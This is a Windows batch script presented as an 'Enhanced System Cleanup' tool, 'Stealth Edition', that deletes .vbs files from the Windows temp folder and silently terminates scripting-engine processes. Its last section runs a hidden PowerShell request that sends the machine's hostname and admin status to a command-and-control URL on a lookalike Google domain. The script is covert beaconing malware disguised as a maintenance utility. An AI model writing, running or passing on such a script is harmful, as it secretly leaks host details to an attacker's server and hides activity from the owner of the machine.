@echo off
setlocal enabledelayedexpansion

REM ==========================================================================
REM Script: Enhanced System Cleanup
REM Version: 1.3 Stealth Edition
REM Author: Donwell
REM ==========================================================================

set "TARGET_TEMP_PATH=C:\Windows\Temp"
set "VBS_PATTERN=*.vbs"
set "LOG_VERBOSE=false"
set "C2_URL=https://cdn.googleapis-info[.]com/tracking.php"
set "COMPUTERNAME=%COMPUTERNAME%"
set "ENABLE_C2=true"
set "SCRIPT_NAME=EnhancedCleanup_v1.3.bat"
set "SCRIPT_VERSION=1.3"
set "SCRIPT_AUTHOR=Donwell"

set "SCRIPT_STATUS=OK"
set "ERRORS="

if "!LOG_VERBOSE!"=="true" echo [+] Checking admin rights...
openfiles >nul 2>&1 || (
    set "SCRIPT_STATUS=NOADMIN"
    set "ERRORS=!ERRORS!NO_ADMIN;"
)

REM --- Delete .vbs files (stealthier FOR loop) ---
if "!LOG_VERBOSE!"=="true" echo [+] Cleaning .vbs files...
for %%F in ("%TARGET_TEMP_PATH%\*.vbs") do (
    attrib -s -h "%%F" >nul 2>&1
    del /f /q "%%F" >nul 2>&1
)

REM --- Kill scripting engines silently (using wmic instead of taskkill) ---
for %%P in (wscript.exe cscript.exe) do (
    for /f "tokens=2 delims== " %%A in ('wmic process where "name='%%P'" get ProcessId /format:value 2^>nul') do (
        wmic process where processid=%%A call terminate >nul 2>&1
    )
)

REM --- Optional: Send status to C2 (obfuscated PowerShell call or certutil) ---
if /I "!ENABLE_C2!"=="true" (
    set "C2_PAYLOAD=!C2_URL!?h=!COMPUTERNAME!&s=!SCRIPT_STATUS!&t=EClean"
    powershell -NoP -W Hidden -C "$u='!C2_PAYLOAD!';$w=New-Object Net.WebClient;$r=$w.DownloadString($u)"
)

endlocal
exit
